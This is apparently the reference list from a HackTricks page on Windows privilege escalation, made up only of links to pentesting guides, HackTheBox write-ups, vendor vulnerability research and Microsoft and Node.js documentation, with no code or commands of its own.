- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)

{{#include ../../banners/hacktricks-training.md}}
